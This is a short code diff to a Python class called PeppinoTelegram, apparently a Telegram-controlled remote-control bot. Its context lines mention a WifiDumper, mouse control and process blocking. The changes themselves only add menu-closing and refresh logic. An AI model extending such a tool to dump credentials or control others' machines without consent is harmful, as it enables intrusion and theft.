@@ -1202,6 +1202,7 @@ class PeppinoTelegram:
         self.mouse_controller_menu = None
         self.processmonitormenu = None
         self.display_mode_keyboard  = None
+        self.cantopenmenu_ref = None
         self.mainmenu_ref = None
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
@@ -1358,7 +1359,8 @@ class PeppinoTelegram:
     def cantopenmenu(self) -> None:
         if self.cantopenlist:
             dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
-            menu = self.new_menu(dict_menu)
+            menu = self.new_menu(dict_menu, close_btn_lab="CANTOP_close")
+            self.cantopenmenu_ref = menu
         else:
             self.bsend("Cantopenlist is empty.")
 
@@ -1919,6 +1921,11 @@ class PeppinoTelegram:
                     self.processmonitormenu.delete()
                     self.processmonitormenushow()
 
+        elif command.startswith("CANTOP"):
+            if command == "CANTOP_close":
+                self.cantopenmenu_ref.delete()
+                self.cantopenmenu_ref = None
+
         elif command.startswith("mainmenu"):
             if self.mainmenu_ref:
                 if command == "mainmenu_close":
@@ -2277,7 +2284,9 @@ class PeppinoTelegram:
         bar.fill_and_delete()
 
     def removefromcantopen(self, process: str) -> None:
+        self.cantopenmenu_ref.delete()
         self.cantopenlist.remove(process)
+        self.cantopenmenu()
         self.bsend(f"🔒 Removed {process} to cantopenlist.")
 
     def restore_wallpaper(self) -> None:
